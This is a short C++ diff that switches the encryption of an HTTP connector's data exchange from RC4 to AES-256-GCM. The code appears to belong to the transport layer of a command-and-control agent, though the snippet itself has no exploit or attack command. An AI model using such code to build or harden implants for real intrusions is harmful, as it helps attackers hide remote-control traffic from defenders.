@@ -439,8 +439,10 @@ void ConnectorHTTP::RecvClear()
 void ConnectorHTTP::Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey)
 {
 	if (plainData && plainSize > 0) {
-		EncryptRC4(plainData, plainSize, sessionKey, 16);
-		this->SendData(plainData, plainSize);
+		int encLen;
+		unsigned char* encData = EncryptAES256GCM(plainData, plainSize, sessionKey, &encLen);
+		this->SendData(encData, encLen);
+		MemFreeLocal((LPVOID*)&encData, encLen);
 	}
 	else {
 		this->SendData(NULL, 0);
@@ -449,8 +451,10 @@ void ConnectorHTTP::Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey)
 	if (this->recvSize > 0 && this->recvData) {
 		int dataSize = this->RecvSize();
 		BYTE* dataPtr = this->RecvData();
-		if (dataSize > 0 && dataPtr)
-			DecryptRC4(dataPtr, dataSize, sessionKey, 16);
+		if (dataSize > 0 && dataPtr) {
+			int plainLen;
+			DecryptAES256GCM(dataPtr, dataSize, sessionKey, &plainLen);
+		}
 	}
 }
 
